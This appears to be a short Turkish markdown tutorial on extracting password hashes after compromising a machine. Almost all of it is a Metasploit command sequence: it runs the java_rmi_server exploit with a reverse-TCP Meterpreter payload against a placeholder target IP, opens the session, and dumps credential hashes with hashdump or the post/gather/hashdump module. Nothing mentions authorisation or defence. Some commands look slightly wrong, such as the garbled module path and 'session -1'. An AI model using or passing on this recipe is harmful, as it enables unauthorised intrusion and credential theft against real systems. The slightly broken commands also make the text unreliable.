# Sistemi Hackledikten Sonra Hash'leri Öğrenme 

#### 1.```nmap``` çalıştırarak açıkları buluyoruz örneğin ```java_rmi_server``` açığı var
``` 
msfconsole
use exploit/multi/handler/misc/java_rmi_server
show payloads
set payload java/meterpreter/reverse_tcp
show options
set rhost <HedefIP>
exploit
sessions -l
session -1
```
#### 2. Sistemi Hackledikten Sonra 
```hashdump``` Hashleri gösterir
#### 3.  Eğer ```hashdump``` çalışmazsa
```run post/linux(ya da windows)/gather/hashdump```
